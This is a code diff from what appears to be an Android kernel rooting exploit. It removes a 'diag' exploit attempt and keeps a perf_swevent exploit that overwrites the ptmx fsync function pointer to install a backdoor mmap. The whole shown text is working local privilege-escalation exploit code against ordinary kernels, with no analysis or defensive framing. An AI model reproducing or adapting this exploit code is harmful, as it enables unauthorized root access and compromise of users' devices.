@@ -9,7 +9,6 @@
 #include "perf_swevent.h"
 #include "ptmx.h"
 #include "mm.h"
-#include "libdiagexploit/diag.h"
 #include "backdoor_mmap.h"
 
 #define PAGE_SHIFT        12
@@ -170,18 +169,6 @@ sizeof_do_mmap(void)
 #endif
 
 static bool
-attempt_diag_exploit(unsigned long int address, void *user_data)
-{
-  struct diag_values injection_data;
-
-  injection_data.address = address;
-  injection_data.value = (uint16_t)&install_mmap;
-
-  return diag_run_exploit(&injection_data, 1,
-                          run_install_mmap, user_data);
-}
-
-static bool
 run_exploit(void)
 {
   unsigned long int ptmx_fsync_address;
@@ -194,11 +181,7 @@ run_exploit(void)
 
   ptmx_fsync_address = ptmx_fops_address + 0x38;
 
-  if (attempt_diag_exploit(ptmx_fsync_address, (void *)ptmx_fops_address)) {
-    return true;
-  }
-
-  printf("\nAttempt perf_swevent exploit...\n");
+  printf("Attempt perf_swevent exploit...\n");
   return perf_swevent_run_exploit(ptmx_fsync_address, (int)&install_mmap,
                                   run_install_mmap, (void *)ptmx_fops_address);
 }
